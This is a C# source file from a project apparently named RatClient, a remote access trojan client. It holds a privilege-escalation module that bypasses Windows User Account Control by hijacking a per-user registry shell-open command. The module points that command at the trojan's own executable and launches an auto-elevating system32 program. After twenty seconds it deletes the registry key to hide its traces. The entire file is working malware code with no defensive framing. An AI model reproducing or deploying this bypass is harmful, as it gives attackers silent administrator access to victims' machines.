using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace RatClient.PrivEsc
{
    internal class ActionsTools
    {
        private static string exec = $"\"{Info.CurrentexecutablePath}\" -noexit -reconnect";
        public static bool UacBypassMsSetting(string exectype, string regtype)
        {
            bool status = false;
            string subkey = $"SOFTWARE\\Classes\\{regtype}\\shell\\open\\command";

            if (Registry.CurrentUser.OpenSubKey(subkey) == null)
            {
                Registry.CurrentUser.CreateSubKey(subkey);
            }

            using (RegistryKey rk = Registry.CurrentUser.OpenSubKey(subkey, true))
            {
                rk.SetValue("DelegateExecute", "", RegistryValueKind.String);
                rk.SetValue(null, exec, RegistryValueKind.String);
                Process process = new Process();
                process.StartInfo.FileName = $"C:\\windows\\system32\\{exectype}";
                if (process.Start())
                {
                    status = true;
                }
                new Thread(() =>
                {
                    Thread.Sleep(20000);
                    Registry.CurrentUser.DeleteSubKeyTree(subkey);
                }).Start();

            }
            return status;
        }
    }
}
